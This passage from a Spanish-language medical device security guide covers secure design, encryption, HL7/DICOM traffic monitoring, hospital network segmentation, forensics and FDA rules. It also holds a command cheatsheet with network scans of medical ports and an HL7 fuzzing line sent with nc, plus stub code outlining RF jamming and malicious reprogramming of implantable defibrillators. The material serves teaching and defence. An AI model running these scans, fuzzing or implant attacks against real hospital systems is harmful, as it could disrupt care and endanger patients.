2. Clasificacion por riesgo y criticidad
3. Segmentacion de [red](../raw/r3d3s-f0nd4m3nt0s.md) por clase de dispositivo
4. Monitoreo continuo de trafico medico
5. Gestion de vulnerabilidades y parches
6. Plan de respuesta a incidentes
7. Entrenamiento del personal

**Herramientas para inventario:**
- **Medigate/Claroty:** Descubrimiento automatico de dispositivos medicos
- **Dragos:** Monitoreo de trafico [ics](../raw/0t-sc4d4.md)/IoMT
- **Cisco Cyber Vision:** Segmentacion y visibilidad
- **Nozomi:** Analisis de protocolos medicos

### 10.2 Seguridad por Diseno

**Principios de Secure by Design para Dispositivos Medicos:**

- **[cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado):** Todo el trafico de red debe ir [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) ([tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls), DTLS)
- **[autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion):** [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) mutua entre dispositivos y sistemas
- **Integridad:** Firmas digitales para [firmware](../raw/u3f1-r00tk1ts.md#firmware) y actualizaciones
- **Minimo privilegio:** El dispositivo debe ejecutar solo lo necesario
- **[secure boot](../raw/u3f1-r00tk1ts.md#secure-boot):** Verificacion de firma en cada arranque
- **Actualizaciones seguras:** Firmas, cifrado, rollback protection
- **Logging:** Registro de eventos de seguridad

**Implementacion practica:**

```python
class SecureDeviceDesign:
    def verify_firmware_signature(self, firmware_bin, signature, public_key):
        """Verificar firma del firmware antes de actualizar"""
        import hashlib
        from cryptography.hazmat.primitives import hashes, asymmetric
        from cryptography.hazmat.primitives.asymmetric import ec, utils
        
        digest = hashlib.sha256(firmware_bin).digest()
        try:
            public_key.verify(signature, digest, ec.ECDSA(hashes.SHA256()))
            return True  # Firma valida
        except:
            return False  # Firma invalida
    
    def encrypt_communication(self, data, peer_cert):
        """Cifrar comunicacion con certificado del peer"""
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        import os
        
        key = AESGCM.generate_key(bit_length=256)
        aesgcm = AESGCM(key)
        nonce = os.urandom(12)
        ciphertext = aesgcm.encrypt(nonce, data.encode(), None)
        return nonce + ciphertext
```

### 10.3 Cifrado

**Recomendaciones de Cifrado:**

| Componente | Algoritmo Recomendado | Alternativa (bajo recursos) |
|------------|----------------------|----------------------------|
| Comunicacion RF | TLS 1.3 / DTLS 1.3 | [aes](../raw/crypt0-f0r-h4ck3rs.md#aes)-CCM-128 |
| Almacenamiento | AES-256-GCM | AES-128-CCM |
| Firmware | ECDSA P-256 | HMAC-SHA256 |
| Actualizaciones | ECDSA + AES-GCM | AES-CMAC |

### 10.4 Autenticacion

- Autenticacion mutua (mTLS) entre dispositivos y servidores
- BLE: LE Secure Connections con bonding
- NFC: Desafio-respuesta con clave compartida
- Programmers: Certificados digitales con revocacion

### 10.5 Monitoreo Continuo

```python
class MedicalSecurityMonitor:
    def __init__(self):
        self.alerts = []
    
    def monitor_hl7_traffic(self, packet):
        # Detectar patrones anomalos
        anomalies = []
        if "AAAA" in packet:  # Fuzzing detection
            anomalies.append("Posible fuzzing HL7")
        if len(packet) > 10000:
            anomalies.append("Mensaje excesivamente largo")
        if "DELETE" in packet or "DROP" in packet:
            anomalies.append("Palabras SQL en mensaje - posible injection")
        return anomalies
    
    def detect_device_scanning(self, connections_per_sec):
        if connections_per_sec > 10:
            self.alerts.append(f"Escaneo detectado: {connections_per_sec} conex/s")
    
    def audit_medical_access(self, user, device, action):
        print(f"AUDIT: Usuario={user}, Dispositivo={device}, Accion={action}")
        # En produccion: log a SIEM
    
    def detect_dicom_anomaly(self, packet):
        """Detectar anomalias en trafico DICOM"""
        anomalies = []
        if packet.get('command') in ['C-ECHO', 'C-FIND', 'C-MOVE']:
            if packet.get('frequency', 0) > 10:  # Mas de 10 comandos/seg
                anomalies.append("Posible escaneo de PACS")
        return anomalies
```

### 10.6 Gestion de Vulnerabilidades

**Ciclo de Vida de [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) Medica:**

```
1. Descubrimiento
2. Confirmacion y reproduccion
3. Evaluacion de impacto clinico
4. Notificacion al fabricante
5. Desarrollo de parche
6. Validacion regulatoria (FDA 510(k) si aplica)
7. Distribucion del parche
8. Aplicacion (puede requerir cita medica)
9. Verificacion post-parche
```

**Plazos de Parche:** En dispositivos criticos, los parches no pueden aplicarse de inmediato porque requieren [programacion](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md) medica. Es comun que pasen meses entre la disponibilidad del parche y su aplicacion en todos los dispositivos.

### 10.7 Futuro

**Tendencias:**

1. **Cifrado post-cuantico:** Preparacion para ataques cuanticos
2. **Zero Trust en salud:** Autenticacion continua de dispositivos
3. **ML para deteccion:** Anomalias en trafico de dispositivos
4. **Parches OTA seguros:** Actualizaciones seguras por aire
5. **Digital Twins:** Simulacion de dispositivos para pruebas de seguridad
6. **Regulacion mas estricta:** [fda](../raw/m3d-s3c.md#fda) 2023 exige ciberseguridad en PMA
7. **SBOM (Software Bill of Materials):** Inventario de componentes de software en dispositivos
8. **CERT/CSIRT en hospitales:** Equipos dedicados a seguridad medica

---
## 11. Apendices

### 11.1 Glosario

| Termino | Definicion |
|---------|------------|
| AE Title | Application Entity Title - Identificador DICOM |
| C-FIND | Consulta DICOM para buscar objetos |
| C-GET | Recuperacion DICOM de objetos |
| C-MOVE | Transferencia DICOM de objetos a otro destino |
| C-STORE | Almacenamiento DICOM de objetos |
| CGM | Continuous Glucose Monitor |
| DICOM | Digital Imaging and Communications in Medicine |
| EHR/EMR | Electronic Health/Medical Record |
| [fda](../raw/m3d-s3c.md#fda) | Food and Drug Administration |
| FHIR | Fast Healthcare Interoperability Resources |
| HIS | Hospital Information System |
| HL7 | Health Level 7 |
| ICD | Implantable Cardioverter-Defibrillator |
| IoMT | Internet of Medical Things |
| MICS | Medical Implant Communication Service |
| MLLP | Minimum Lower Layer Protocol |
| MRN | Medical Record Number |
| PACS | Picture Archiving and Communication System |
| PMA | Premarket Approval |
| [sdr](../raw/sdr-t3l3c0ms.md) | [software defined radio](../raw/sdr-t3l3c0ms.md) |
| WMTS | Wireless Medical Telemetry Service |
| SBOM | Software Bill of Materials |
| [cve](../raw/s3c-f0nd4m3nt0s.md#cve) | Common Vulnerabilities and Exposures |
| CISA | Cybersecurity and Infrastructure Security Agency |
| PSIRT | Product Security Incident Response Team |
| OTA | Over-The-Air update |

### 11.2 Herramientas Recomendadas

| Herramienta | Uso | Tipo |
|------------|-----|------|
| [ghidra](../raw/4pk-r3v3rs1ng.md#ghidra) | Decompilacion de [firmware](../raw/u3f1-r00tk1ts.md#firmware) | Gratuita |
| binwalk | Extraccion de firmware | Gratuita |
| [hackrf](../raw/sdr-t3l3c0ms.md#hackrf) One | SDR para analisis RF | Hardware |
| Universal Radio Hacker | Reversing de protocolos RF | Gratuita |
| [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark) | Analisis de trafico de [red](../raw/r3d3s-f0nd4m3nt0s.md) | Gratuita |
| Scapy | Manipulacion de paquetes | Gratuita |
| Orthanc | Servidor PACS de prueba | Gratuita |
| DCMTK | Herramientas CLI DICOM | Gratuita |
| pydicom | Biblioteca [python](../raw/pyth0n-f0r-h4ck1ng.md) DICOM | Gratuita |
| Mirth Connect | Motor de integracion HL7 | Gratuita |
| OpenOCD | Depuracion JTAG/SWD | Gratuita |
| FirmWire | Emulacion de firmware | Gratuita |
| Kaitai Struct | Parsing de protocolos | Gratuita |

### 11.3 Cheatsheet de Comandos

```bash
# HL7 - Enviar mensaje MLLP
echo -n $'\x0B'MSH|...$'\x1C\x0D' | nc 192.168.1.100 2575

# HL7 - Sniffing
sudo ngrep -d eth0 port 2575

# HL7 - Ver todos los segmentos
tcpdump -i eth0 port 2575 -X -A

# DICOM - Listar archivo
dcmdump imagen.dcm | head -50

# DICOM - Consultar PACS
findscu -S -aec PACS -aet TEST 192.168.1.100 11112 query.dcm

# DICOM - Enviar a PACS
storescu -aec PACS -aet TEST 192.168.1.100 11112 imagen.dcm

# DICOM - Escanear PACS
nmap -p 11112 192.168.1.0/24

# Firmware - Analizar
binwalk -Me firmware.bin
strings firmware.bin | grep -i password
strings firmware.bin | grep -i crypto\|aes\|rsa

# Red - Escanear dispositivos medicos
nmap -p 21,23,80,443,2575,11112,11223 192.168.1.0/24

# Red - Capturar HL7
tcpdump -i eth0 port 2575 -X

# Red - Capturar DICOM
tcpdump -i eth0 port 11112 -X

# Depuracion - OpenOCD SWD
openocd -f interface/stlink.cfg -f target/stm32f4x.cfg

# SDR - Capturar 916 MHz
rtl_sdr -f 916M -s 2M captura.bin

# SDR - Analizar con URH
urh

# Offensive - Fuzzear HL7
python3 -c "print('A'*10000)" | nc 192.168.1.100 2575

# Defensa - Firewall medical network
iptables -A INPUT -p tcp --dport 2575 -s 10.10.0.0/16 -j ACCEPT
iptables -A INPUT -p tcp --dport 2575 -j DROP
```

## 12. Seguridad en Dispositivos Implantables

### 12.1 Marcapasos y Cardiodesfibriladores (ICD)

Los ICDs son dispositivos implantables que monitorean el ritmo cardiaco y pueden administrar descargas electricas.

**Fabricantes:**
- Medtronic (Evera, Visia, Amplia)
- Abbott (St. Jude Medical)
- Boston Scientific
- Biotronik

**Protocolos de comunicacion:**
- MICS (Medical Implant Communication Service): 402-405 MHz
- NFC a corta distancia (programmers)
- Bluetooth LE (modelos modernos)

**Vulnerabilidades conocidas:**
- [cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2018-0230: [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) debil en [programacion](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md) inalambrica
- CVE-2019-12930: Denegacion de servicio por RF
- Comunicacion sin cifrar en modelos [legacy](../raw/l3g4cy-3nt3rpr1s3.md)
- Comandos de reprogramacion sin autenticacion

```python
class ICDAttackVectors:
    def rf_denial_of_service(self, target_freq=403e6):
        """Bloquear telemetria del ICD con noise RF"""
        print(f"Transmitiendo ruido en {target_freq/1e6} MHz")
        print("  Efecto: ICD no puede comunicarse con programador")
        print("  Riesgo: No se pueden leer datos ni reprogramar")
        return {'attack': 'RF jamming', 'frequency': target_freq}
    
    def reprogram_icd_parameters(self):
        """Modificar parametros de terapia del ICD"""
        params = {
            'tachy_threshold': 'Cambiado de 200 a 150 bpm (descargas innecesarias)',
            'brady_pacing': 'Desactivado (paciente sin ritmo de respaldo)',
            'shock_energy': 'Reducido a 0J (descarga inefectiva)',
        }
        return params
```

### 12.2 [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) de Telemetria Medtronic

```python
class MedtronicTelemetry:
    def __init__(self):
        self.protocol = {
            'frequency': '402-405 MHz MICS',
            'modulation': 'FSK',
            'range': '2-5 metros',
            'encryption': 'AES-128 (modelos 2015+) / None (legacy)'
        }
    
    def capture_telemetry_session(self):
        """Capturar sesion de telemetria entre programador e ICD"""
        print("Fases de una sesion de telemetria:")
        print("  1. Wake-up: programador envia tono de activacion")
        print("  2. Handshake: intercambio de IDs")
        print("  3. Autenticacion: desafio-respuesta")
        print("  4. Sesion: intercambio de datos")
        print("  5. Terminacion: cierre de sesion")
        
        vulnerabilities = {
            'wakeup': 'Sin autenticacion - cualquier dispositivo puede despertar el ICD',
            'handshake': 'ID de dispositivo en texto claro',
            'auth': 'Desafio predecible en modelos legacy',
            'session': 'Datos de telemetria sin cifrar (modelos legacy)',
        }
        return vulnerabilities
```

### 12.3 Defensa para Dispositivos Implantables

```python
class ImplantableSecurity:
    def defense_measures(self):
        return {
            'cryptography': [
                'AES-256 para comunicacion',
                'ECDSA P-256 para autenticacion',
                'Claves unicas por dispositivo',
            ],
            'protocol': [
                'Desafio-respuesta con nonce aleatorio',
                'Rate limiting (max 3 intentos de autenticacion)',
                'Timeout de sesion (30 seg sin actividad → cierre)',
            ],
            'physical': [
                'Proximidad requerida (< 5 cm para programacion)',
                'Escudo RF en modo avion',
                'Deteccion de RF jamming',
            ],
            'monitoring': [
                'Logging de intentos de conexion',
                'Alerta de multiples intentos fallidos',
                'Registro de reprogramaciones',
            ]
        }
```

## 13. Analisis [forense](../raw/w1n-f0r3ns1cs.md#forense) de Dispositivos Medicos

### 13.1 Recoleccion de Evidencia

```bash
# Evidencia volatil en dispositivos medicos:
# 1. Estado actual del dispositivo
# 2. Logs de eventos recientes
# 3. Historial de alarmas
# 4. Registro de reprogramaciones
# 5. Paciente conectado (datos en RAM)

# Evidencia no volatil:
# 1. Firmware completo
# 2. Logs historicos
# 3. Configuracion del dispositivo
# 4. Datos de pacientes almacenados
# 5. Archivos de auditoria

# Herramientas:
# - JTAG/SWD para acceso directo al microcontrolador
# - SDR para capturar comunicacion inalambrica
# - binwalk para extraer firmware
# - Ghidra para decompilar firmware
```

### 13.2 Cadena de Custodia para Dispositivos Medicos

```python
class MedicalDeviceChainOfCustody:
    def __init__(self):
        self.evidence_log = []
    
    def document_device_state(self, device_id, initial_state):
        """Documentar estado inicial del dispositivo"""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'device_id': device_id,
            'battery_level': initial_state['battery'],
            'firmware_version': initial_state['firmware'],
            'patient_connected': initial_state['patient'],
            'last_interrogation': initial_state['last_interrogation'],
            'alarm_log_count': initial_state['alarm_count'],
        }
        self.evidence_log.append(entry)
        return entry
    
    def hash_firmware(self, firmware_path):
        """Hashear firmware para integridad"""
        import hashlib
        with open(firmware_path, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()
```

## 14. Regulacion y Compliance en Seguridad Medica

### 14.1 Regulaciones Clave

| Regulacion | Region | Alcance |
|-----------|--------|---------|
| [fda](../raw/m3d-s3c.md#fda) Premarket (510k/PMA) | USA | Aprobacion de dispositivos |
| FDA Postmarket | USA | Monitoreo post-comercializacion |
| MDR ([medical device](../raw/m3d-s3c.md) Regulation) | EU | Regulacion europea |
| HIPAA | USA | Privacidad de datos medicos |
| [gdpr](../raw/l3g4l-c0mpl14nc3.md#gdpr) | EU | Proteccion de datos |
| IMDRF | Global | Guias de ciberseguridad |
| AAMI TIR57 | USA | Principios de seguridad |

### 14.2 Requisitos FDA de Ciberseguridad (2023+)

```bash
# La FDA ahora requiere:
# 1. SBOM (Software Bill of Materials) en la solicitud
# 2. Plan de monitoreo de vulnerabilidades
# 3. Actualizaciones seguras OTA
# 4. Coordinacion de divulgacion de vulnerabilidades
# 5. Autenticacion multifactor en programmers

# Documentacion requerida:
# - Security Risk Analysis
# - Threat Model
# - Penetration Test Report
# - Vulnerability Disclosure Policy
# - SBOM en formato SPDX o CycloneDX
```

### 14.3 Ejercicios Practicos Adicionales

**Ejercicio 14.1:** Reversing de [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) MICS: Captura trafico de telemetria de un ICD (simulado) y analiza la estructura del paquete.

**Ejercicio 14.2:** Evaluacion de seguridad: Toma un [dispositivo medico](../raw/m3d-s3c.md) (real o simulado) y realiza: threat modeling, analisis de [firmware](../raw/u3f1-r00tk1ts.md#firmware), pruebas de comunicacion.

**Ejercicio 14.3:** Compliance check: Verifica que un dispositivo medico cumple con los requisitos de ciberseguridad de la FDA 2023.

**Ejercicio 14.4:** Forensic analysis: Dado un dispositivo medico comprometido, recolecta evidencia, preserva la cadena de custodia, y documenta los hallazgos.

## 15. Seguridad en [redes](../raw/r3d3s-f0nd4m3nt0s.md) Hospitalarias

### 15.1 Segmentacion de [red](../raw/r3d3s-f0nd4m3nt0s.md) Medica

```bash
# La red hospitalaria debe segmentarse en zonas:
# Zona 1: Administrativa (EHR, HIS, facturacion)
# Zona 2: Clinica (dispositivos medicos, PACS, LIS)
# Zona 3: IoT (sensores, camaras, clima)
# Zona 4: Pacientes (WiFi para visitas)
# Zona 5: DMZ (portal paciente, telehealth)

# Cada zona con firewall y politicas especificas:
# - Zona 1 → Zona 2: Solo protocolos HL7/DICOM
# - Zona 2 → Internet: Bloqueado (excepto updates firmados)
# - Zona 3 → Zona 1: Bloqueado
# - Zona 4 → Resto: Bloqueado

# Ejemplo iptables para segmentacion:
iptables -A FORWARD -s 10.1.0.0/16 -d 10.2.0.0/16 -p tcp --dport 2575 -j ACCEPT
iptables -A FORWARD -s 10.1.0.0/16 -d 10.2.0.0/16 -j DROP
```

### 15.2 Monitoreo de Trafico Medico

```python
class MedicalTrafficMonitor:
    def analyze_hl7_anomalies(self, pcap_file):
        """Analizar trafico HL7 buscando anomalias"""
        from scapy.all import rdpcap, TCP, IP
        
        packets = rdpcap(pcap_file)
        anomalies = []
        
        for pkt in packets:
            if TCP in pkt and (pkt[TCP].sport == 2575 or pkt[TCP].dport == 2575):
                payload = bytes(pkt[TCP].payload)
                if b'\x0B' in payload:
                    # Extraer mensaje HL7
                    start = payload.index(b'\x0B') + 1
                    end = payload.index(b'\x1C\x0D')
                    msg = payload[start:end].decode('ascii', errors='replace')
                    
                    # Detectar anomalias
                    if len(msg) > 100000:  # Mensaje muy grande
                        anomalies.append(('large_message', msg[:100], pkt[IP].src))
                    if 'PID' not in msg and 'MSH' in msg:  # Sin datos de paciente
                        anomalies.append(('no_pid', msg[:100], pkt[IP].src))
                    
        return anomalies
    
    def detect_dicom_scanning(self, packets, threshold=100):
        """Detectar escaneo de PACS"""
        from collections import Counter
        sources = Counter()
        for pkt in packets:
            if pkt.haslayer(TCP) and pkt[TCP].dport == 11112:
                sources[pkt[IP].src] += 1
        
        scanners = {ip: count for ip, count in sources.items() if count > threshold}
        return scanners
    
    def medical_device_fingerprinting(self, ip, ports):
        """Identificar tipo de dispositivo medico por fingerprint de red"""
        fingerprints = {
            (2575,): 'HL7 Gateway - Mirth Connect',
            (11112,): 'PACS - DICOM Server',
            (5353,): 'Medtronic CareLink - mDNS',
            (443, 8443): 'FHIR API Server',
            (22, 443): 'Infusion Pump - Network Interface',
        }
        return fingerprints.get(tuple(sorted(ports)), 'Unknown Device')
```

### 15.3 Ejercicios de Red Hospitalaria

**Ejercicio 15.1:** Disena una segmentacion de red para un hospital de 200 camas. Define: subredes, VLANs, reglas de [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls), y politicas de acceso.

**Ejercicio 15.2:** Implementa un monitor de trafico HL7 que detecte: mensajes malformados, valores fuera de rango, y patrones de [fuzzing](../raw/fuzz1ng.md).

**Ejercicio 15.3:** Crea un sistema de alertas para deteccion de escaneo de dispositivos medicos en la red.

## 16. Smart Hospitals y IoMT Security

### 16.1 IoMT Attack Surface

```bash
# Internet of Medical Things (IoMT) expande la superficie de ataque:
# - Smart beds: sensores de presion, movimiento
# - Smart pumps: bombas de infusion WiFi
# - Patient monitors: signos vitales en red
# - Smart IV poles: control de fluidos
# - Asset tracking: RFID para equipos
# - Environmental sensors: temperatura, humedad

# Protocolos IoMT comunes:
# - BLE (Bluetooth Low Energy)
# - Zigbee (bajo consumo, malla)
# - WiFi (alta velocidad)
# - LoRaWAN (larga distancia)
# - NFC (proximidad)

# Riesgos:
# - Dispositivos sin autenticacion
# - Firmware sin actualizar
# - Comunicacion sin cifrar
# - Default credentials
```

### 16.2 Defensa para Smart Hospitals

```python
class SmartHospitalDefense:
    def iot_device_onboarding(self, device):
        """Proceso seguro de incorporacion de dispositivos IoT"""
        steps = [
            '1. Verificar identidad del dispositivo (certificado unico)',
            '2. Escanear vulnerabilidades conocidas',
            '3. Asignar VLAN dedicada segun tipo',
            '4. Configurar firewall: solo trafico necesario',
            '5. Habilitar logging y monitoreo',
            '6. Programar actualizaciones de firmware',
        ]
        return steps
    
    def medical_iot_security_policy(self):
        """Politica de seguridad para IoMT"""
        return {
            'authentication': 'Certificados X.509 unicos por dispositivo',
            'encryption': 'TLS 1.3 para comunicacion WiFi, AES-CCM para BLE',
            'firmware': 'Actualizaciones firmadas con verificacion',
            'network': 'Segmentacion por tipo de dispositivo',
            'monitoring': 'Analisis de trafico anomalo',
            'incident_response': 'Plan especifico para compromiso IoMT',
        }
```
```


